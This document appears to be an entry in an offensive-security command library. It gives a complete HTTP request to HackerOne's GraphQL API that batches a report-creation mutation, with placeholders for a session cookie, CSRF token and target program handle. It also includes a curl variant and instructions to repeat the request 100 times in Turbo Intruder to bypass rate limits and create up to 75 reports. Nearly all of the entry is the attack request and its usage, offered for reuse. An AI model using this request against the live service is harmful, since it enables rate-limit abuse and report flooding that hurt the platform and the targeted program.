---
id: cmd-http-post-001
data: >-
  POST /graphql HTTP/2 Host: hackerone.com Cookie: {your-h1-cookie}
  Content-Length: 1173 Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
  X-Csrf-Token: {your-csrf-token} Sec-Ch-Ua-Mobile: ?0 User-Agent: Mozilla/5.0
  (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
  Chrome/117.0.5938.63 Safari/537.36 Content-Type: application/json
  X-Product-Feature: inbox Accept: */* X-Product-Area: reports
  Sec-Ch-Ua-Platform: "Linux" Origin: https://hackerone.com Sec-Fetch-Site:
  same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Accept-Encoding: gzip,
  deflate, br Accept-Language: en-US,en;q=0.9 { "operationname": "CreateReport",
  "variables":{ "team_handle":"{target-team-handle}", "product_area":"reports",
  "product_feature":"inbox" }, "query": "{your-generated-query}" }
tags:
  - graphql
  - api
type: command
output: 'Successful creation of up to 75 reports if exploited, or error if limits hit'
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:57.220Z'
verified: false
validated: true
submitted: true
---
# post-batched-report-request

## Command

```http
POST /graphql HTTP/2
Host: hackerone.com
Cookie: {your-h1-cookie}
Content-Length: 1173
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
X-Csrf-Token: {your-csrf-token}
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Content-Type: application/json
X-Product-Feature: inbox
Accept: */*
X-Product-Area: reports
Sec-Ch-Ua-Platform: "Linux"
Origin: https://hackerone.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

{
  "operationName": "CreateReport",
  "variables": {
    "team_handle": "{target-team-handle}",
    "product_area": "reports",
    "product_feature": "inbox"
  },
  "query": "{your-generated-query}"
}
```

## Description

Sends a batched GraphQL mutation to HackerOne to create multiple reports, used in Burp/Turbo Intruder for rate limit bypass.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| query | Batched GraphQL mutation string | Yes |
| team_handle | Target program handle | Yes |
| Cookie | HackerOne session cookie | Yes |
| X-Csrf-Token | CSRF protection token | Yes |

## Examples

### Basic Usage

Send via curl (adapted):

```bash
curl -X POST https://hackerone.com/graphql -H "Cookie: ..." -H "X-Csrf-Token: ..." -d '{...}'
```

### Advanced Usage

In Turbo Intruder, repeat 100x with race script.

## Expected Output

JSON response with { was_successful: true } for each operation, or errors if limited.

## Related

- [[Related Procedure: Configure-and-Execute-Turbo-Intruder-Race-Attack]]
